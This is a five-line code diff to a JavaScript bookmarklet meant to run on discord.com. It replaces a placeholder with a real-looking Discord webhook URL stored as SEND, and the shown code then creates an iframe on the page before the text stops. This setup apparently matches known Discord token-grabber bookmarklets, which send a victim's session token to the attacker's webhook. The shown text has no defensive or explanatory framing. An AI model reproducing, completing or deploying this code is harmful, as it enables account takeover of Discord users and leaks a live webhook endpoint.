@@ -1,5 +1,5 @@
 javascript: void (function () {
-  var SEND = "<YOUR_WEBHOOK_HERE>";
+  var SEND = "<https://discord.com/api/webhooks/985349587927719937/2ur_fwRrLdRTOrcXClp_j_cL4qQTY9ph9qKssrKVs1Wk81I0BjNkLoB8KqO4GXkpblUj>";
   "https://discord.com" == this.document.location.origin &&
     (function () {
       const a = document.createElement("iframe");
